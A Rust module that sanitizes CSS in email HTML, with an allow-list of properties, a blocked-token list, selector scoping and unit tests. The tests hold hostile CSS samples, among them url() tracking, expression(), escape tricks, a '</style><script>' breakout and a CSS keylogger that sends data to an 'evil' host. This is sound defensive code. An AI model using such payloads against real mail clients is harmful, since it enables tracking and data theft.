//! CSS sanitizing for email HTML (ARCHITECTURE §14.3).
//!
//! Email CSS is hostile: `url()` and `@import` leak that a message was opened (and from where),
//! `expression()` / `behavior` / `-moz-binding` run code in old engines, `position: fixed` can
//! overlay the client UI, and CSS escapes (`u\72l(`) hide all of the above from naive filters.
//! The rules here are an allow-list:
//!
//! - Declarations: only properties in [`ALLOWED_PROPERTIES`]; any value containing `url(`,
//!   `image(`, `image-set(`, `expression(`, `var(`, `attr(`, `env(`, `@`, a backslash, `<`, `>` or
//!   a `javascript:`/`vbscript:`/`data:` scheme is dropped; `position` is never allowed.
//! - Stylesheets (`<style>`): comments removed, every at-rule dropped except `@media` (whose inner
//!   rules are sanitized the same way), selectors limited to a safe character set and scoped under
//!   `.akatsuki-body` (`html`/`body`/`:root` become `.akatsuki-body` itself).

/// The class of the wrapper element every sanitized body is wrapped in.
pub const BODY_CLASS: &str = "akatsuki-body";

/// CSS properties allowed in `style` attributes and `<style>` rules.
pub const ALLOWED_PROPERTIES: &[&str] = &[
    "background-color",
    "border",
    "border-bottom",
    "border-bottom-color",
    "border-bottom-left-radius",
    "border-bottom-right-radius",
    "border-bottom-style",
    "border-bottom-width",
    "border-collapse",
    "border-color",
    "border-left",
    "border-left-color",
    "border-left-style",
    "border-left-width",
    "border-radius",
    "border-right",
    "border-right-color",
    "border-right-style",
    "border-right-width",
    "border-spacing",
    "border-style",
    "border-top",
    "border-top-color",
    "border-top-left-radius",
    "border-top-right-radius",
    "border-top-style",
    "border-top-width",
    "border-width",
    "box-sizing",
    "caption-side",
    "clear",
    "color",
    "direction",
    "display",
    "empty-cells",
    "float",
    "font",
    "font-family",
    "font-size",
    "font-style",
    "font-variant",
    "font-weight",
    "height",
    "letter-spacing",
    "line-height",
    "list-style-position",
    "list-style-type",
    "margin",
    "margin-bottom",
    "margin-left",
    "margin-right",
    "margin-top",
    "max-height",
    "max-width",
    "min-height",
    "min-width",
    "opacity",
    "overflow",
    "overflow-wrap",
    "padding",
    "padding-bottom",
    "padding-left",
    "padding-right",
    "padding-top",
    "table-layout",
    "text-align",
    "text-decoration",
    "text-decoration-color",
    "text-decoration-line",
    "text-decoration-style",
    "text-indent",
    "text-transform",
    "unicode-bidi",
    "vertical-align",
    "visibility",
    "white-space",
    "width",
    "word-break",
    "word-spacing",
    "word-wrap",
];

/// Value fragments that disqualify a declaration (compared lowercase, after comment removal).
const FORBIDDEN_IN_VALUE: &[&str] = &[
    "url(",
    "image(",
    "image-set(",
    "cross-fade(",
    "element(",
    "expression(",
    "var(",
    "attr(",
    "env(",
    "javascript:",
    "vbscript:",
    "data:",
    "@",
    "\\",
    "<",
    ">",
    "behavior",
    "-moz-binding",
];

/// Removes `/* … */` comments (an unterminated comment swallows the rest, as in CSS).
pub fn strip_comments(css: &str) -> String {
    let mut out = String::with_capacity(css.len());
    let mut rest = css;
    while let Some(start) = rest.find("/*") {
        out.push_str(&rest[..start]);
        match rest[start + 2..].find("*/") {
            Some(end) => rest = &rest[start + 2 + end + 2..],
            None => return out,
        }
        out.push(' ');
    }
    out.push_str(rest);
    out
}

/// Splits on `;` outside quotes and parentheses.
fn split_declarations(css: &str) -> Vec<&str> {
    let mut parts = Vec::new();
    let (mut depth, mut quote, mut start) = (0_i32, None::<char>, 0);
    for (i, c) in css.char_indices() {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), _) => {}
            (None, '"' | '\'') => quote = Some(c),
            (None, '(') => depth += 1,
            (None, ')') => depth -= 1,
            (None, ';') if depth <= 0 => {
                parts.push(&css[start..i]);
                start = i + 1;
            }
            _ => {}
        }
    }
    parts.push(&css[start..]);
    parts
}

/// One allowed declaration, `property: value`.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Declaration {
    /// Lowercase property name.
    pub property: String,
    /// Trimmed value (may end with `!important`).
    pub value: String,
}

fn sanitize_declaration(raw: &str) -> Option<Declaration> {
    let (prop, value) = raw.split_once(':')?;
    let prop = prop.trim().to_ascii_lowercase();
    let value = value.trim();
    if value.is_empty() || !ALLOWED_PROPERTIES.contains(&prop.as_str()) {
        return None;
    }
    if value.chars().any(char::is_control) {
        return None;
    }
    let lower = value.to_ascii_lowercase();
    if FORBIDDEN_IN_VALUE.iter().any(|f| lower.contains(f)) {
        return None;
    }
    // Non-ASCII in values is only plausible inside font names; refuse it elsewhere so homoglyph
    // tricks cannot smuggle function names.
    if !value.is_ascii() && prop != "font-family" && prop != "font" {
        return None;
    }
    // `display` is allowed only with layout values a message legitimately uses.
    if prop == "display" {
        let ok = [
            "none",
            "block",
            "inline",
            "inline-block",
            "table",
            "table-row",
            "table-cell",
            "list-item",
            "flex",
            "inline-table",
            "table-row-group",
            "table-header-group",
            "table-footer-group",
        ];
        let v = lower.trim_end_matches("!important").trim();
        if !ok.contains(&v) {
            return None;
        }
    }
    Some(Declaration { property: prop, value: value.to_owned() })
}

/// Parses and filters a declaration list (a `style` attribute or a rule body).
pub fn sanitize_declarations(css: &str) -> Vec<Declaration> {
    let css = strip_comments(css);
    split_declarations(&css).into_iter().filter_map(sanitize_declaration).collect()
}

/// Renders declarations as `prop:value;prop:value`.
pub fn render_declarations(decls: &[Declaration]) -> String {
    decls.iter().map(|d| format!("{}:{}", d.property, d.value)).collect::<Vec<_>>().join(";")
}

/// Sanitizes a `style` attribute value. `None` when nothing survives.
pub fn sanitize_style_attribute(css: &str) -> Option<String> {
    let decls = sanitize_declarations(css);
    (!decls.is_empty()).then(|| render_declarations(&decls))
}

const SELECTOR_CHARS: &str = " \t\n_-.#:>+~*,[]=\"'()|^$";

fn safe_selector(sel: &str) -> bool {
    !sel.trim().is_empty() && sel.chars().all(|c| c.is_ascii_alphanumeric() || SELECTOR_CHARS.contains(c))
}

/// Scopes one selector under `.akatsuki-body`.
fn scope_selector(sel: &str) -> String {
    let sel = sel.trim();
    let lower = sel.to_ascii_lowercase();
    for root in ["html body", "html", "body", ":root"] {
        if lower == root {
            return format!(".{BODY_CLASS}");
        }
        if let Some(rest) = lower.strip_prefix(root)
            && rest.starts_with([' ', '>', '.', '#', ':', '['])
        {
            let rest = &sel[root.len()..];
            // `body.x` / `body#id` / `body[attr]` describe the root itself; anything after a
            // combinator or space is a descendant.
            return if rest.starts_with([' ', '>']) {
                format!(".{BODY_CLASS}{rest}")
            } else {
                format!(".{BODY_CLASS}")
            };
        }
    }
    format!(".{BODY_CLASS} {sel}")
}

/// Splits a stylesheet into top-level blocks: `(prelude, body)` for `x { … }` and `(prelude,
/// None)` for statements ending in `;`. Braces inside quotes are respected.
fn top_level_blocks(css: &str) -> Vec<(String, Option<String>)> {
    let mut out = Vec::new();
    let chars: Vec<char> = css.chars().collect();
    let (mut i, mut prelude) = (0, String::new());
    let mut quote: Option<char> = None;
    while i < chars.len() {
        let c = chars[i];
        if let Some(q) = quote {
            prelude.push(c);
            if c == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match c {
            '"' | '\'' => {
                quote = Some(c);
                prelude.push(c);
            }
            ';' => {
                out.push((std::mem::take(&mut prelude), None));
            }
            '{' => {
                let mut depth = 1;
                let mut body = String::new();
                let mut q: Option<char> = None;
                i += 1;
                while i < chars.len() && depth > 0 {
                    let c = chars[i];
                    if let Some(qq) = q {
                        if c == qq {
                            q = None;
                        }
                    } else {
                        match c {
                            '"' | '\'' => q = Some(c),
                            '{' => depth += 1,
                            '}' => depth -= 1,
                            _ => {}
                        }
                    }
                    if depth > 0 {
                        body.push(c);
                    }
                    i += 1;
                }
                out.push((std::mem::take(&mut prelude), Some(body)));
                continue;
            }
            '}' => {} // stray
            _ => prelude.push(c),
        }
        i += 1;
    }
    out
}

fn sanitize_rules(css: &str, depth: u32, out: &mut Vec<String>) {
    for (prelude, body) in top_level_blocks(css) {
        let prelude = prelude.trim();
        let Some(body) = body else { continue }; // `@import …;`, `@charset …;`, garbage
        if let Some(at) = prelude.strip_prefix('@') {
            let lower = at.to_ascii_lowercase();
            if depth == 0 && lower.starts_with("media") {
                let query = at[5..].trim();
                let query_ok = query.chars().all(|c| c.is_ascii_alphanumeric() || " \t\n():,.-".contains(c))
                    && !query.to_ascii_lowercase().contains("url");
                if query_ok {
                    let mut inner = Vec::new();
                    sanitize_rules(&body, depth + 1, &mut inner);
                    if !inner.is_empty() {
                        out.push(format!("@media {query}{{{}}}", inner.join("")));
                    }
                }
            }
            continue;
        }
        let selectors: Vec<&str> = prelude.split(',').collect();
        if selectors.iter().any(|s| !safe_selector(s)) {
            continue;
        }
        let decls = sanitize_declarations(&body);
        if decls.is_empty() {
            continue;
        }
        let scoped = selectors.iter().map(|s| scope_selector(s)).collect::<Vec<_>>().join(",");
        out.push(format!("{scoped}{{{}}}", render_declarations(&decls)));
    }
}

/// Sanitizes a `<style>` element's text. Returns an empty string when nothing survives.
pub fn sanitize_stylesheet(css: &str) -> String {
    let css = strip_comments(css);
    // Escapes can rebuild any forbidden token; a sheet that uses them is dropped entirely.
    if css.contains('\\') || css.to_ascii_lowercase().contains("</style") {
        return String::new();
    }
    let mut out = Vec::new();
    sanitize_rules(&css, 0, &mut out);
    out.join("")
}

/// Parses a CSS length in pixels (`"1px"`, `"1"`, `"0"`); other units return `None`.
pub fn px(value: &str) -> Option<f64> {
    let v = value.trim().trim_end_matches("!important").trim().to_ascii_lowercase();
    let v = v.strip_suffix("px").unwrap_or(&v);
    v.trim().parse::<f64>().ok()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn inline_allow_list() {
        assert_eq!(
            sanitize_style_attribute("color: red; position: fixed; top:0; FONT-WEIGHT: bold"),
            Some("color:red;font-weight:bold".into())
        );
        assert_eq!(sanitize_style_attribute("background: url(https://t.example/p.gif)"), None);
        assert_eq!(sanitize_style_attribute("background-color: url(x)"), None);
        assert_eq!(sanitize_style_attribute("width: expression(alert(1))"), None);
        assert_eq!(sanitize_style_attribute("color: red; behavior: url(x.htc)"), Some("color:red".into()));
        assert_eq!(sanitize_style_attribute("color: u\\72l(x)"), None);
        assert_eq!(sanitize_style_attribute("color: /* x */ blue"), Some("color:blue".into()));
        assert_eq!(
            sanitize_style_attribute("font-family: 'Hiragino Sans', \"ヒラギノ\"; color:#fff"),
            Some("font-family:'Hiragino Sans', \"ヒラギノ\";color:#fff".into())
        );
        assert_eq!(sanitize_style_attribute("display: none"), Some("display:none".into()));
        assert_eq!(sanitize_style_attribute("display: -webkit-box"), None);
        assert_eq!(sanitize_style_attribute("color: var(--x)"), None);
        assert_eq!(sanitize_style_attribute("color:red;;;"), Some("color:red".into()));
    }

    #[test]
    fn stylesheet_scoping_and_at_rules() {
        let css = "@import url(https://evil/x.css); body { color: red } p.x, td { margin: 0; background: url(http://t/p.gif) } \
                   @font-face { font-family: X; src: url(https://evil/f.woff) } \
                   @media (max-width: 600px) { .col { width: 100% !important } }";
        assert_eq!(
            sanitize_stylesheet(css),
            ".akatsuki-body{color:red}.akatsuki-body p.x,.akatsuki-body td{margin:0}@media (max-width: 600px){.akatsuki-body .col{width:100% !important}}"
        );
    }

    #[test]
    fn stylesheet_exfiltration_attempts() {
        // Attribute selectors plus url() are the classic CSS keylogger/exfil; url() never survives.
        assert_eq!(sanitize_stylesheet("input[value^=a] { background: url(https://evil/?a) }"), "");
        assert_eq!(sanitize_stylesheet("p { color: red } @import 'x';"), ".akatsuki-body p{color:red}");
        assert_eq!(sanitize_stylesheet("p{color:\\72 ed}"), "");
        assert_eq!(sanitize_stylesheet("p { color: red } </style><script>alert(1)</script>"), "");
        assert_eq!(sanitize_stylesheet("p{{color:red}"), "");
        assert_eq!(sanitize_stylesheet("@media screen { @media print { p { color: red } } }"), "");
        assert_eq!(sanitize_stylesheet("html > body p { color: red }"), ".akatsuki-body > body p{color:red}");
        assert_eq!(sanitize_stylesheet("body > p { color: red }"), ".akatsuki-body > p{color:red}");
        assert_eq!(sanitize_stylesheet("body.dark { color: red }"), ".akatsuki-body{color:red}");
    }

    #[test]
    fn lengths() {
        assert_eq!(px("1px"), Some(1.0));
        assert_eq!(px(" 0 "), Some(0.0));
        assert_eq!(px("1em"), None);
    }
}
